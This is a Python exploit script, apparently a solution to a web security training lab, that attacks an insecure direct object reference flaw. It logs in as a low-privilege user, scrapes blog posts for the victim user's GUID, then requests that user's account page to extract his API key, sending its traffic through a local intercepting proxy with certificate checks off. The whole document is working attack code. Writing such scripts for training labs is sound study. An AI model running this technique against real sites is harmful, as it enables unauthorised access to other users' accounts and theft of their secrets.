import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None

def login(url:str, s:requests.Session, csrf:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def find_carlos_guid(url:str, s:requests.Session):
    try:
        r = s.get(url, verify=False, proxies=proxies, timeout=5)
        response = r.text
        posts_ids = re.findall(r'postId=(\w+)"', response)
        unique_posts_ids = list(set(posts_ids))
        for post_id in unique_posts_ids:
            try:
                r = s.get(url + '/post?postId=' + post_id, verify=False, proxies=proxies, timeout=5)
                response = r.text
                if 'carlos' in response:
                    print(f"Carlos GUID is found!")
                    guid = re.findall(r"userId=(.*)'", response)[0]
                    return guid
            except requests.exceptions.RequestException as ex:
                print(f"Error: {ex}")
                print("Could not find carlos's GUID")
                return None
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        print("Could not open the home page")
        return None
    print("Could not find carlos's GUID ")
        
def get_api_key(url:str, s:requests.Session, guid:str):
    account_url = url + '/my-account?id=' + guid
    try:
        r = s.get(account_url, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'carlos' in response:
            print("Successfully accessed carlos's account!")
            api_key = re.findall(r'Your API Key is:(.*)\<\/div>', response)
            return api_key
        else:
            print("Could not find api key")
            return None
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return None

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    csrf = get_csrf(url + '/login', s)
    if not csrf:
        print("Could not find csrf token")
        sys.exit(-1)
    
    print("Logging in as wiener")

    if not login(url, s, csrf):
        sys.exit(-1)
    
    guid = find_carlos_guid(url, s)
    if not guid:
        sys.exit(-1)
    
    api_key = get_api_key(url, s, guid)
    if api_key:
        print(f"Carlos's API key: {api_key}")
    else:
        print("Could not get carlos's api key")

if __name__ == '__main__':
    main()